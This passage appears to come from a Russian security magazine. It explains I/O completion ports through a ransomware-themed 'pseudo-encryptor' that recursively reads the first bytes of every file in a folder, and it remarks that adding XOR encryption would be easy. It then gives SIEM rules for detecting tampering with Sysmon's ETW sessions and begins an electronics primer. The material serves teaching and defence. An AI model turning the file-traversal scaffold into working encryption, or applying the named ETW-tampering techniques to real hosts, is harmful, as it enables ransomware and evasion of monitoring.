   запись из IOCP, мы могли отличить одну операцию от другой. Или, нап‐
   ример, одну бабушку от другой. Обычно в качестве ключа используется
   указатель на структуру данных, которая содержит тип операции, дескрип‐
   тор и буфер данных. Буфер данных — что угодно. Но в минимальном виде
   можно использовать и просто один байт, который будет показывать, что
   за асинхронная операция случилась (чтение, запись или что‑то другое).
   Этот      буфер       данных       можно       получить      через
  GetQueuedCompletionStatus() ,  он  будет  лежать  в  параметре
  lpCompletionKey;
 • NumberOfConcurrentThreads —  предельно допустимое количество
   потоков, которым  разрешено  параллельное  выполнение.  Если  этот
   параметр равен нулю, то в качестве предела используется количество
   процессоров, установленных в системе. В случае если мы добавляем
   в IOCP какой‑то дескриптор, это поле игнорируется.

Итак, сначала следует создать сам IOCP-порт, то есть больницу. Делается
вот так:


HANDLE iocp=CreateIoCompletionPort(INVALID_HANDLE_VALUE,0,0,0);

Следующий шаг — создание потоков для пула потоков, то есть создание вра‐
чей. Сколько делать — решает программист, все зависит от задачи и пот‐
ребностей (количества бабушек). Обычно число процессоров на системе
равно числу потоков в пуле. Но это значение можно и менять.


struct ThreadData {
  HANDLE hIOCP;
};


ThreadData threadData;
threadData.hIOCP = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL,
0, iocpThreadCount);
if (threadData.hIOCP == NULL) {
  std::wcerr << L"CreateIoCompletionPort failed with error: " <<
GetLastError() << std::endl;
  return 1;
}


HANDLE hThreads[iocpThreadCount];
for (int i = 0; i < iocpThreadCount; ++i) {
  hThreads[i] = CreateThread(NULL, 0, WorkerThread, &threadData, 0,
NULL);
  if (hThreads[i] == NULL) {
    std::wcerr << L"CreateThread failed with error: " << GetLastError
() << std::endl;
    return 1;
  }
}

Вот чуть более простой пример, без структуры и массива.


for(int i=1;i<=2;i++)
{
  HANDLE hWorking=CreateThread(0,0,(LPTHREAD_START_ROUTINE)&
WorkingThread,iocp,0,0);
  CloseHandle(hWorking);
}

Обрати внимание, что мы здесь четвертым параметром передаем хендл
нашего IOCP, чтобы связать конкретный поток с пулом потоков в IOCP. Этот
хендл понадобится потокам, когда они начнут заявлять о своей готовности
начать работать. Этот хендл будет передан в функцию WorkingThread()
как lParam и в дальнейшем использован в GetQueuedCompletionStatus().
   Полноценные примеры кода, где я продемонстрирую эту и следующие
функции, будут в конце статьи.


ПРИСОЕДИНЕНИЕ ПОТОКА К ПУЛУ ПОТОКОВ

GetQueuedCompletionStatus()
Эта функция нужна, чтобы присоединить текущий поток (который ее вызыва‐
ет) к пулу потоков. Обычно она вызывается из callback-функции потока.


BOOL GetQueuedCompletionStatus(
  HANDLE CompletionPort,
  LPDWORD lpNumberOfBytes,
  PULONG_PTR lpCompletionKey,
  LPOVERLAPPED *lpOverlapped,
  DWORD dwMilliseconds);

Именно на этой функции поток из пула потоков IOCP будет спать до тех пор,
пока не получит IRP-сообщение. А после получения приступит к обработке
записи из очереди IOCP.
   Здесь
 • CompletionPort — IOCP-порт, к пулу потоков которого присоединять
   поток;
 • lpNumberOfBytes — указатель на переменную, в которую запишется
   количество переданных байтов в результате завершения асинхронной
   операции.  Эти  данные  заполняются  автоматически  и  присутствуют
   в записи, которая добавляется в очередь IOCP. Если записей в очереди
  IOCP нет, то мы можем вручную добавить новую запись в IOCP через
  PostQueuedCompletionStatus() ;
 • lpCompletionKey — ключ завершения. По нему, чисто теоретически,
   можно определять, что за файл завершил работу, так как этот ключ ука‐
   зывается для каждого файла при вызове CreateIoCompletionPort() .
   Эти данные заполняются автоматически и присутствуют в записи, которая
   добавляется в очередь IOCP. Если записей в IOCP-очереди нет, то мы
  можем    вручную   добавить   новую   запись   в   IOCP   через
  PostQueuedCompletionStatus() . Причем через этот параметр можно
   получать и кастомные структуры. Например, у нас есть следующая струк‐
   тура, которую мы используем для получения информации о том, над каким
   файлом операция асинхронного чтения завершилась;
 • dwMilliseconds — время, на которое может уснуть поток в ожидании
   появления в очереди IOCP какой‑нибудь записи. INFINITE — бесконеч‐
   но.


struct IOData
{
  OVERLAPPED overlapped;
  HANDLE fileHandle;
  wchar_t buffer[dwReadBufferSize] = { 0 };
  wchar_t filePath[MAX_PATH] = { 0 };
  DWORD bytesRead;
};

Обрати внимание, что первым параметром  указывается сама  структура
OVERLAPPED. Эти данные заполняются перед вызовом асинхронной операции
и перед тем, как файловый хендл будет связан с IOCP.


if (hFile != INVALID_HANDLE_VALUE)
{
 IOData* pIOData = new IOData{};
 memset(pIOData, 0, sizeof(IOData));
 pIOData->fileHandle = hFile;
 wcscpy_s(pIOData->filePath, MAX_PATH, findFileData.cFileName);


 CreateIoCompletionPort(hFile, hIOCP, (ULONG_PTR)pIOData, 0);


 ReadFile(hFile, pIOData->buffer, dwReadBufferSize, NULL, &pIOData->
overlapped);
}

Парсинг структуры происходит тут, в функции потока из пула потоков.


DWORD WINAPI WorkerThread(LPVOID lpParam)
{
  HANDLE hIOCP = (HANDLE)lpParam;
  DWORD bytesTransferred;
  ULONG_PTR key;
  LPOVERLAPPED lpOverlapped;
  IOData* pData = nullptr;


  while (GetQueuedCompletionStatus(hIOCP, &bytesTransferred, &key, &
lpOverlapped, INFINITE))
  {
    // Парсинг
    pData = (IOData*)key;


  }
  return 0;
}

 • lpOverlapped — указатель на OVERLAPPED-структуру, ассоциированную
   с этой операцией ввода‑вывода. Эти данные заполняются автоматически
   и присутствуют в записи, которая добавляется в очередь IOCP. Если
   записей очереди в IOCP нет, то мы можем вручную добавить новую запись
   через PostQueuedCompletionStatus() .

Фактически, вызывая эту функцию, мы засовываем поток  (врача) в пул
потоков IOCP (больницу) и приостанавливаем его выполнение до тех пор,
пока не появится какая‑нибудь запись в очереди IOCP (пока не придет
бабушка). Причем функция вернет поток управления только после появления
в очереди новых записей. Мы можем пробудить потоки, если отправим сооб‐
щение вручную, например через PostQueuedCompletionStatus().


                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ
      АСИНХРОННАЯ
       РАНСОМВАРЬ
          РАЗБИРАЕМ МЕХАНИЗМ САМЫХ
            БЫСТРЫХ КРИПТОЛОКЕРОВ





ОТПРАВКА СООБЩЕНИЯ I/O COMPLETION PACKET ВРУЧНУЮ

PostQueuedCompletionStatus()
Представь, что у нас есть какая‑то элитная бабушка, которую нужно принуди‐
тельно   записать   в    очередь.  В   таком    случае    используется
PostQueuedCompletionStatus() —   функция,   позволяющая   вручную
добавить запись в очередь IOCP.


BOOL PostQueuedCompletionStatus(
  HANDLE CompletionPort,
  DWORD dwNumberOfBytesTransferred,
  ULONG_PTR dwCompletionKey,
  LPOVERLAPPED lpOverlapped);

 • CompletionPort — порт IOCP, на который отправлять I/O completion
   packet;
 • dwNumberOfBytesTransferred — значение, которое попадает в фун‐
   кции     GetQueuedCompletionStatus()      в      переменную
  lpNumberOfBytesTransferred;
 • dwCompletionKey — ключ завершения. Значение, которое попадает
   в    функции   GetQueuedCompletionStatus()    в    переменную
  lpCompletionKey;
 • lpOverlapped — OVERLAPPED-структура. Значение, которое попадает
   в    функции   GetQueuedCompletionStatus()    в    переменную
  lpOverlapped.

Для пробуждения ожидающих потоков, когда нет завершившихся операций,
иногда отсылают фиктивное значение  ключа, например  -1. Ожидающие
потоки должны проверять значения ключей, и таким образом можно просиг‐
нализировать потоку, что пора прекратить работу.


ПРИМЕР ПСЕВДОШИФРОВАЛЬЩИКА

Думаю, мы готовы реализовывать порт IOCP с пулом потоков. Ты будешь
удивлен, но код небольшой. Логика его проста: асинхронное чтение файлов
из папки с последующим выводом первых пяти байтов (собственно, поэтому я
и назвал программу псевдошифровальщиком). Все параметры контролиру‐
ются в глобальных переменных, поэтому добавить простейшую XOR-опе‐
рацию с последующим WriteFile(), думаю, не составит труда.
  Я решил не разбирать каждую строку, а добавить достаточно понятные
комментарии в код.


#include <Windows.h>
#include <iostream>
#include <locale.h>
#include <string>


CRITICAL_SECTION gCritSection;
// Четыре треда в пуле
CONST DWORD iocpThreadCount = 4;
// Читаем 5 байт
CONST DWORD dwReadBufferSize = 5;
CONST std::wstring folder = L"C:\\Users\\Michael\\Downloads";


struct IOData
{
  OVERLAPPED overlapped;
  HANDLE fileHandle;
  wchar_t buffer[dwReadBufferSize] = { 0 };
  wchar_t filePath[MAX_PATH] = { 0 };
  DWORD bytesRead;
};


DWORD WINAPI WorkerThread(LPVOID lpParam)
{
  HANDLE hIOCP = (HANDLE)lpParam;
  DWORD bytesTransferred;
  ULONG_PTR key;
  LPOVERLAPPED lpOverlapped;
  IOData* pData = nullptr;


  // Ждем бабушку тут. Врачи в состоянии queued thread
  while (GetQueuedCompletionStatus(hIOCP, &bytesTransferred, &key, &
lpOverlapped, INFINITE))
  {
    // Пришла бабушка
    EnterCriticalSection(&gCritSection);
    if (key == 0)
    {
      // Это была не бабушка, а главврач. Работа закончена!
      std::wcout << L"Thread in IOCP 0 records, received manual IRP
from PostQueued. Exiting" << std::endl;
      LeaveCriticalSection(&gCritSection);
      break;
    }
    pData = (IOData*)key;


    if (bytesTransferred > 0)
    {
      std::wcout << L"File: " << pData->filePath << std::endl;
      std::wcout << L"Bytes: ";
      for (DWORD i = 0; i < 5; ++i) {
        std::wcout << static_cast<int>(pData->buffer[i]) << L" ";
      }
      std::wcout << std::endl;
    }
    else
    {
      std::wcerr << L"IO Failed or transferred 0 bytes" << std::endl;
    }
    LeaveCriticalSection(&gCritSection);
    CloseHandle(pData->fileHandle);
    // Бабушка обслужена. Идем к следующей
    delete pData;
  }
  return 0;
}


VOID ProcessFolder(const std::wstring& folder, HANDLE hIOCP)
{
  WIN32_FIND_DATAW findFileData;
  HANDLE hFind = FindFirstFileW((folder + L"\\*").c_str(), &
findFileData);


  if (hFind != INVALID_HANDLE_VALUE)
  {
    do
    {
      if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
)
      {
        HANDLE hFile = CreateFileW((folder + L"\\" + findFileData.
cFileName).c_str(), GENERIC_READ,
          FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED,
NULL);


        if (hFile != INVALID_HANDLE_VALUE)
        {
          IOData* pIOData = new IOData{};
          memset(pIOData, 0, sizeof(IOData));
          pIOData->fileHandle = hFile;
          wcscpy_s(pIOData->filePath, MAX_PATH, findFileData.
cFileName);


      // Прикрепляем бабушку к больнице
          CreateIoCompletionPort(hFile, hIOCP, (ULONG_PTR)pIOData, 0)
;


      // Триггер асинхронной операции
      // По завершении функция GetQueuedCompletionStatus() вернет
потоку поток управления
          ReadFile(hFile, pIOData->buffer, dwReadBufferSize, NULL, &
pIOData->overlapped);
        }
        else
        {
          std::wcerr << L"Failed to open file: " << GetLastError() <<
std::endl;
        }
      }
      else
      {
        if (wcscmp(findFileData.cFileName, L".") != 0 && wcscmp(
findFileData.cFileName, L"..") != 0)
        {
          ProcessFolder(folder + L"\\" + findFileData.cFileName,
hIOCP);
        }
      }
    } while (FindNextFileW(hFind, &findFileData) != 0);
    FindClose(hFind);
  }
}



int main()
{
  InitializeCriticalSection(&gCritSection);
  setlocale(LC_ALL, "");
  // Создание больницы
  HANDLE hIOCP = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0
, 0);


  HANDLE hThreads[iocpThreadCount];
  for (DWORD i = 0; i < iocpThreadCount; i++)
  {
    // Добавление врача в больницу
    hThreads[i] = CreateThread(NULL, 0, WorkerThread, hIOCP, 0, NULL)
;
    if (hThreads[i] == NULL)
    {
      std::wcerr << L"CreateThread failed with error: " <<
GetLastError() << std::endl;
      return 1;
    }
  }


  // Пушинг бабушек
  ProcessFolder(folder, hIOCP);


  for (int i = 0; i < iocpThreadCount; i++)
  {
    // Завершение работы врачей
    PostQueuedCompletionStatus(hIOCP, 0, 0, NULL);
  }


  WaitForMultipleObjects(iocpThreadCount, hThreads, TRUE, INFINITE);
  for (HANDLE hThread : hThreads)
  {
    CloseHandle(hThread);
  }


  DeleteCriticalSection(&gCritSection);
  CloseHandle(hIOCP);
  return 0;
}





                            Пример работы


ИСПОЛЬЗОВАНИЕ ВСТРОЕННОГО ПУЛА ПОТОКОВ

BindIoCompletionCallback()
Этот метод позволяет связать конкретный хендл с дефолтным пулом потоков,
который присутствует в каждом процессе. Фактически вместо того, чтобы
создавать собственный IOCP и пул потоков, мы используем готовый.


BOOL BindIoCompletionCallback(
  [in] HANDLE              FileHandle,
  [in] LPOVERLAPPED_COMPLETION_ROUTINE Function,
  [in] ULONG               Flags
);

Здесь
 • FileHandle — хендл, над которым проводят асинхронные операции;
 • Function — колбэк‑функция, которую нужно вызвать после выполнения
   асинхронной операции (I/O completion packet отправляется автоматичес‐
    ки);
 • Flags — дополнительные флаги. Обычно 0.


Пример кода
Вернемся к нашей программе из прошлой части статьи. Выведем первые
пять байтов файлов из C:\Users\Michael\Downloads.





                            Пример работы


#include <windows.h>
#include <iostream>
#include <string>
#include <locale.h>


CRITICAL_SECTION ConsoleCriticalSection;


struct ReadContext {
  OVERLAPPED overlapped;
  HANDLE hFile;
  wchar_t buffer[5];
  wchar_t filePath[MAX_PATH];
};


void CALLBACK FileIOCompletionRoutine(DWORD dwErrorCode, DWORD
dwNumberOfBytesTransfered, LPOVERLAPPED lpOverlapped) {
  ReadContext* context = reinterpret_cast<ReadContext*>(lpOverlapped)
;


  // Пришла новая бабушка. Добавляем критическую секцию для
синхронизации вывода на консоль
  EnterCriticalSection(&ConsoleCriticalSection);
  if (dwErrorCode == 0 && dwNumberOfBytesTransfered > 0) {
    std::wcout << L"File path: " << context->filePath << std::endl;
    std::wcout << L"First 5 bytes: ";
    for (DWORD i = 0; i < dwNumberOfBytesTransfered / sizeof(wchar_t)
; ++i) {
      std::wcout << static_cast<int>(context->buffer[i]) << L" ";
    }
    std::wcout << std::endl;
  }
  else {
    std::wcerr << L"IO operation failed or transferred no bytes." <<
std::endl;
  }
  LeaveCriticalSection(&ConsoleCriticalSection);


  CloseHandle(context->hFile);
  delete context;
}


void InitiateRead(HANDLE hFile, const wchar_t* filePath) {
  ReadContext* context = new ReadContext();
  ZeroMemory(context, sizeof(ReadContext));
  wcscpy_s(context->filePath, filePath);


  if (BindIoCompletionCallback(hFile, FileIOCompletionRoutine, 0)) {
    // Связываем бабушку с больницей
    ReadFile(hFile, context->buffer, sizeof(context->buffer), NULL, &
context->overlapped);
    // После завершения асинхронной операции бабушка придет в
FileIOCompletionRoutine
  }
  else {
    CloseHandle(context->hFile);
    delete context;
  }
}


int wmain() {
  setlocale(LC_ALL, "");
  InitializeCriticalSection(&ConsoleCriticalSection);



  WIN32_FIND_DATA findFileData;
  HANDLE hFind = FindFirstFile(L"C:\\Users\\Michael\\Downloads\\*", &
findFileData);


  if (hFind == INVALID_HANDLE_VALUE) {
    std::wcerr << L"FindFirstFile failed with error: " <<
GetLastError() << std::endl;
    return 1;
  }


  do {
    if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
{
      std::wstring filePath = L"C:\\Users\\Michael\\Downloads\\" +
std::wstring(findFileData.cFileName);
      HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ,
FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);


      if (hFile == INVALID_HANDLE_VALUE) {
        continue;
      }


      // Начинаем асинхронную операцию
      InitiateRead(hFile, filePath.c_str());
    }
  } while (FindNextFile(hFind, &findFileData) != 0);


  FindClose(hFind);
  SleepEx(5000, TRUE);
  DeleteCriticalSection(&ConsoleCriticalSection);
  return 0;
}


ВЫВОДЫ

Я постарался более‑менее простыми словами объяснить достаточно слож‐
ную концепцию. Получилось или нет — судить тебе. Ну а если получилось, то
смею надеяться, что применять изложенное ты будешь только в законных
целях.


        WWW

                            Если тебе интересно почитать про работу шиф‐
                        ровальщиков больше, то обрати внимание на эти
                            отчеты:
                         •LockBit   3.0   Analysis:  How   to   Enhance
                       Ransomware and Malware Protection
                         •LockBit 3.0 Ransomware Analysis
                         •LockBit Ransomware Analysis Notes
ВЗЛОМ





На пути атакующего часто стоят системы
EDR, цель которых — обнаружить  атаку
и сообщить о ней первой линии обороны
SOC.  Чтобы  оставаться  незамеченными,
пентестерам приходится обходить монито‐             driverenok                                                                                                       Threat Researcher
ринг. В этой  статье  поговорим о  том,        andreykras14@gmail.com
как именно это делается в случае с атаками
на Windows.


Как известно, один из основных механизмов Windows, на который полагаются
большинство решений класса EDR, — это Event Tracing for Windows. Он
как поставляет данные для формирования алертов, так и делает записи
в привычном нам журнале событий (в отдельных случаях).
   Ранее мы уже разбирали, как атакующие могут воздействовать на под‐
систему ETW, чтобы сделать Sysmon максимально бесполезным. В этом
материале мы  посмотрим,  как  эти  техники  можно  детектировать  (как
ни странно, но с помощью того же самого ETW).


Читай также

 • Ослепить Sysmon. Выводим мониторинг из строя максимально незаметно
 • Ослепить Sysmon полностью. Манипулируем объектами ETW, чтобы обой‐
   ти мониторинг
 • Добиваем мониторинг. Как работают продвинутые атаки на Sysmon
 • Детект на связи. Учимся обнаруживать следы атак на EDR




KERNEL EVENT TRACING

Давай плавно перейдем к эксплуатации второго механизма, с помощью
которого EDR получают события, а точнее, к детекту попыток вмешаться
в работу подсистемы ETW. В предыдущих материалах я показывал техники,
которыми могут воспользоваться атакующие при воздействии на подсистему
ETW, чтобы изменить поведение Sysmon. Приведу их список:
 1. Отключение провайдера Microsoft-Windows-DNS-Client от сессии
  SysmonDnsEtwSession .
 2. Изменение параметров сессии SYSMON TRACE с целью отключения всех
   событий системного провайдера SystemTraceProvider .
 3. Отбор (фильтрация) событий провайдеров на уровне сессий путем изме‐
   нения значений параметров MatchAnyKeyword и MatchAllKeyword.

В этом разделе мы посмотрим, как можно обнаруживать такую активность,
и  попробуем  написать  детектирующую  логику  на  языке   eXtraction
and Processing и Event Query Language. Штатные механизмы Windows поз‐
воляют отследить эту активность, однако для этого нам потребуется кое‑что
настроить.
  В системе присутствует замечательный провайдер, с помощью которого
можно отслеживать воздействия на ETW, — Microsoft-Windows-Kernel-
EventTracing. Но  большинство событий  этого  провайдера без  пред‐
варительной настройки недоступны. Если точнее, его события разделены
на два журнала — Admin и Analytic. В последний записываются события
запуска и остановки ETW-сессии, изменения ее параметров и дескриптора
безопасности, добавления и удаления из нее провайдеров, в общем —
огромная ценность для безопасников. Аналитический журнал по умолчанию
выключен. Его необходимо включить, чем мы и займемся в первую очередь.


ГОТОВИМ ИНФРАСТРУКТУРУ

В проде события журнала Analytic включаются с помощью групповых политик
и соответствующих подписок на WEC-сервере.


Включаем журнал
Итак, для включения Analytic в реестре нужно прописать несколько ключей.
Давай попробуем это сделать.
   Создаем объект групповой политики.





Теперь открываем вот эту ветку реестра:


HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\
Channels\Microsoft-Windows-Kernel-EventTracing/Analytic

И добавляем ключи, как на скриншоте ниже.





Параметр Enabled включает ведение журнала.
  В MaxSize укажем размер журнала равным 20 Мбайт (0x1400000).
  С помощью параметра Retention указываем, что необходимо переза‐
писать старые события, если размер журнала достигнет максимального зна‐
чения.


Настраиваем подписку
Аналитический  журнал мы  включили,  осталось  только  дождаться, пока
политика распространится на хосты (ну или воспользоваться инструментом
gpupdate). Теперь давай настроим подписку для сбора этих событий.





Здесь мы выбираем «Источники событий — Kernel-EventTracing».


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
           SYSMON   НАДЗОР ЗА
           ЗАЩИЩАЕМ МОНИТОРИНГ
       ОТ АТАК ШТАТНЫМИ СРЕДСТВАМИ
                         WINDOWS





ДЕТЕКТИМ МАНИПУЛЯЦИИ С ETW

Итак, давай немного вспомним, как связан механизм ETW и Sysmon.
  В системе присутствуют несколько сессий, связанных с работой Sysmon.





Сессии SYSMON TRACE и SysmonDnsEtwSession создаются для того, чтобы
служба Sysmon64 могла получать сообщения о сетевых соединениях и DNS-
запросах. Эта информация  поступает от  провайдеров,  присутствующих
в Windows «из коробки».
   Также Sysmon во время работы регистрирует собственный провайдер —
Microsoft-Windows-Sysmon, который и определяет перечень возможных
EventId.





Для отслеживания этих событий Sysmon создает отдельную сессию —
EventLog-Microsoft-Windows-Sysmon-Operational, с помощью которой
служба журнала событий Windows их читает и записывает в соответствующий
журнал.


Детектим отключение провайдера от сессии
Способ 1 — с помощью Kernel Event Tracing
Сессия SysmonDnsEtwSession потребляет события провайдера Microsoft-
Windows-DNS-Client.





Давай попробуем отключить его от сессии.





По  аналогии  можно  отключить  провайдер  Microsoft-Windows-Sysmon
от сессии EventLog-Microsoft-Windows-Sysmon-Operational.





И посмотрим, какие события  появятся в  журнале Microsoft-Windows-
Kernel-EventTracing\Analytic.





Мы видим событие EventId 15, которое говорит о том, что провайдер был
отключен  от  сессии SysmonDnsEtwSession. Событие не  предоставляет
информации об имени провайдера, только идентификатор:


{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D}

GUID  соответствует провайдеру Microsoft-Windows-DNS-Client. Однако
имя провайдера — это не обязательный параметр, так как само по себе
отключение провайдера от SysmonDnsEtwSession подозрительно.
  На основе этой информации можно получить условие формирования
алерта:


event SysmonSession_DisableProvider:
    key:
        event_src.host
    filter {
        filter::NotFromCorrelator() and
        lower(event_src.title) ==
"microsoft-windows-kernel-eventtracing" and
        msgid == "15" and
        in_list(["sysmondnsetwsession",
"eventlog-microsoft-windows-sysmon-operational"], lower(object.name))
    }


rule Sysmon_provider_disabled_from_Sysmon_session:
SysmonSession_DisableProvider

У Sysmon две сессии, из которых есть возможность исключить провайдер, —
это   SysmonDnsEtwSession   и   EventLog-Microsoft-Windows-Sysmon-
Operational. Причем если из первой сессии исключить провайдер, то
Sysmon потеряет лишь информацию о событиях клиента DNS, в случае же
со второй Sysmon ослепнет полностью.
   Полный текст правила можно посмотреть в репозитории Open XP Rules.
   Корреляция для Elastic SIEM будет выглядеть следующим образом.





Способ 2 — с помощью Security Auditing
Отлично, мы посмотрели, как можно детектить манипуляции с объектами ETW
на основе событий провайдера Microsoft-Windows-Kernel-EventTracing,
но есть еще один способ. Как известно, параметры ETW-сессий сохраняются
в реестре


HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\

Атакующий может сделать куда проще и изменить их прямо там. За потребле‐
ние событий конкретного провайдера сессией отвечает флаг Enabled:


HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\<
SessionName>\<ProviderGuid>

Если значение этого параметра установить равным нулю, то сессия перес‐
танет потреблять события провайдера (при следующем старте системы,
разумеется).





Детектить эту активность можно с помощью штатного аудита (EventId 4657,
при условии, что навешан соответствующий SACL на ветку реестра) либо
с помощью самого Sysmon, ведь изменения вступят в силу только при сле‐
дующем старте системы и есть вероятность, что EventId 13 все‑таки успеет
дойти до SIEM.
   Поэтому давай настроим SACL с помощью GPO.





И посмотрим на событие.





Здесь мы видим, что ключ Enable поменял свое значение с 1 на 0. Дополним
нашу корреляцию:


event SysmonSession_DisableProvider:
    key:
        event_src.host
    filter {
        filter::NotFromCorrelator() and
        lower(event_src.title) ==
"microsoft-windows-kernel-eventtracing" and
        msgid == "15" and
        in_list(["sysmondnsetwsession",
"eventlog-microsoft-windows-sysmon-operational"], lower(object.name))
    }


 event SysmonEtwSession_CmParamsModified:
    key:
        event_src.host
    filter {
        filter::NotFromCorrelator() and ((
            event_src.title == "windows" and
            msgid == "4657"
        ) or (
            event_src.title == "sysmon" and
            msgid == "13" )
        ) and
        in_list(["create", "modify"], lower(action)) == True and
        regex(object.path, ".*wmi\\\\autologger\\\\
eventlog-microsoft-windows-sysmon-operational.*", 0) != null and
        lower(object.name) == "enabled"
    }


rule Sysmon_provider_disabled_from_Sysmon_session:
SysmonSession_DisableProvider or SysmonEtwSession_CmParamsModified


Детектим изменение флагов сессии SYSMON TRACE
Как ты помнишь, к сессии SYSMON TRACE подключен системный провайдер,
манипулировать которым можно, меняя флаги сессии (поле EnableFlags).





Давай отключим все события системного провайдера от этой сессии.





На этот раз у нас будет сформировано событие EventId  12 в журнале
Microsoft-Windows-Kernel-EventTracing\Analytic.





Это событие не  предоставляет  детальной информации об  изменении
параметра EnableFlags, однако факт изменения настроек этой сессии тоже
подозрителен.
  И получаем еще один детект на языке XP:


event SysmonSession_GenericParamsModified:
    key:
        event_src.host
    filter {
        filter::NotFromCorrelator() and
        lower(event_src.title) == "microsoft-windows-kernel-
eventtracing" and
        msgid == "12" and
        lower(object.name) == "sysmon trace"
    }
rule Sysmon_session_modified: SysmonSession_Modified

Полный текст правила выложен на GitHub.
   Вот как это же правило будет выглядеть для Elastic SIEM.





Детектим изменения параметров отбора событий
Способ 1 — с помощью Kernel Event Tracing
Давай посмотрим на параметры  сессии EventLog-Microsoft-Windows-
Sysmon-Operational.





Эта сессия нужна для того, чтобы служба журнала событий Windows могла
писать события Sysmon в файл EVTX.
   Как видно из скрина, служба потребляет события единственного провай‐
дера — Microsoft-Windows-Sysmon. Как я писал в статье  «Добиваем
мониторинг», для каждого из провайдеров на уровне сессии может происхо‐
дить фильтрация (отбор) событий с помощью параметров MatchAnyKeyword
и   MatchAllKeyword.  По   дефолту   эти   параметры   установлены
в 0xffffffffffffffff и 0x0, что  означает потреблять  абсолютно все
события. Атакующие могут модифицировать эти параметры, чтобы скрыть
вредоносную активность. Например, если параметр MatchAnyKeyword уста‐
новить в 0x1, то сессия перестанет потреблять события. В этом случае в жур‐
нале  Microsoft-Windows-Kernel-EventTracing\Analytic  будет  сфор‐
мировано следующее событие.





Помимо поля SessionName, нам для формирования детекта понадобится
поле   MatchAnyKeyword,   которое   будет   отличаться   от   значения
18446744073709551615.
   Если изменить параметр MatchAllKeyword на 0xffffffffffffffff, то
это аналогичным образом скажется на формировании событий в журнале
EVTX и появится событие, как на скриншоте.





В этом случае мы видим изменение значения поля MatchAllKeyword (теперь
оно отлично от 0x00).
  На основе данных событий мы можем сформировать следующее условие
корреляции:


event SysmonSession_MatchParamsModified:
     key:
        event_src.host
    filter {
        filter::NotFromCorrelator() and
        lower(event_src.title) ==
"microsoft-windows-kernel-eventtracing" and
        msgid == "14" and
        in_list(["eventlog-microsoft-windows-sysmon-operational",
"sysmondnsetwsession"], lower(object.name)) and
        ($datafield5 != "18446744073709551615" or $datafield6 != "0")
    }


rule Sysmon_session_modified: SysmonSession_MatchParamsModified

Полный текст правила лежит на GitHub.
   Если портировать его на Elastic SIEM, то оно будет выглядеть так, как на
скринах ниже.





Способ 2 — с помощью Security Auditing
Так же как и в случае с отключением провайдера от ETW-сессии, эту
активность можно детектить на основе EventId 4657 и Sysmon 13. Давай
посмотрим, как это выглядит.





И для MatchAllKeyword.





Дополним наше правило:


event SysmonSession_GenericParamsModified:
    key:
        event_src.host
    filter {
        filter::NotFromCorrelator() and
        lower(event_src.title) ==
"microsoft-windows-kernel-eventtracing" and
        msgid == "12" and
        lower(object.name) == "sysmon trace"
    }


event SysmonSession_MatchParamsModified:
     key:
        event_src.host
    filter {
        filter::NotFromCorrelator() and
        lower(event_src.title) ==
"microsoft-windows-kernel-eventtracing" and
        msgid == "14" and
        in_list(["eventlog-microsoft-windows-sysmon-operational",
"sysmondnsetwsession"], lower(object.name)) and
        ($datafield5 != "18446744073709551615" or $datafield6 != "0")
    }


event SysmonSession_CmMatchParamsModified:
    key:
        event_src.host
    filter {
        filter::NotFromCorrelator() and ((
            event_src.title == "windows" and
            msgid == "4657"
        ) or (
            event_src.title == "sysmon" and
            msgid == "13" )
        ) and
        in_list(["create", "modify"], lower(action)) == True and
        regex(object.path, ".*wmi\\\\autologger\\\\
eventlog-microsoft-windows-sysmon-operational.*", 0) != null and (
            lower(object.name) == "matchallkeyword" or
            lower(object.name) == "matchanykeyword"
        )
    }


rule Sysmon_session_modified: SysmonSession_GenericParamsModified or
SysmonSession_MatchParamsModified or
SysmonSession_CmMatchParamsModified


ВЫВОДЫ

Итак, в этом материале мы с тобой посмотрели, как можно ловить атаки
на Sysmon с помощью штатного аудита Windows. На этом мы завершим наше
увлекательное путешествие в мир написания детектов и пойдем копить новый
материал!
GEEK





Без полупроводников не обходится ни одно
цифровое  устройство,  а  чтобы  из  них
собирать цифровые  схемы,  нужно знать
вольт‑амперные  характеристики. В  этой
статье подробно разберем, что такое ВАХ,              prostorosty                                                                                                    I'm just a TechnoFreak.
как ее измерять вручную и с помощью мик‐        7753313vv@gmail.com
роконтроллера.


ТЕОРИЯ

Прежде чем приступать к практике, нужно разобрать  несколько важных
моментов, которые понадобятся нам в работе. Для начала, конечно, стоит
вспомнить, что же такое полупроводник.


             INFO

                            Если хочешь еще сильнее освежить свои знания
                        в электронике, прочитай предыдущие мои статьи.
                   В них описаны базовые понятия и электронные
                           компоненты, которые нам сегодня понадобятся:
                       •Цифровая   электроника  с  самого  начала.
                         Собираем схемы на MOSFET-транзисторах
                       •Бунт   многоножек.   Собираем   устройство
                         с интегральными микросхемами



Полупроводники
Что приходит в голову, когда слышишь слово «полупроводник»? Полупровод‐
ники используются чуть ли не во всех современных устройствах, полупровод‐
ник — это главная инновация эпохи. Мы прошли огромный путь от опытов
Фарадея до первых транзисторов и до современных компьютеров.
   Любая микросхема, лежащая в основе цифрового устройства, состоит
из транзисторов, в прошлых статьях про электронику я о них подробно рас‐
сказывал. А транзисторы, в свою очередь, создаются на основе именно
полупроводников.
  Сам по себе полупроводник — это вещество, имеющее особые свойства
проводимости электричества. «Какие еще особые свойства? — спросишь
ты. — Ток есть ток, подал на один конец проводника плюс питания, на другой
минус, ток и течет!» А вот в этом и есть изюминка полупроводников. По наз‐
ванию понятно, что они находятся как бы между проводниками и диэлектри‐
ками, то есть между материалами, ток полностью проводящими, и матери‐
алами, не проводящими ток вовсе. Проводить или не проводить — вот в чем
вопрос!
   Так вот, суть полупроводника в том, что свойства его проводимости могут
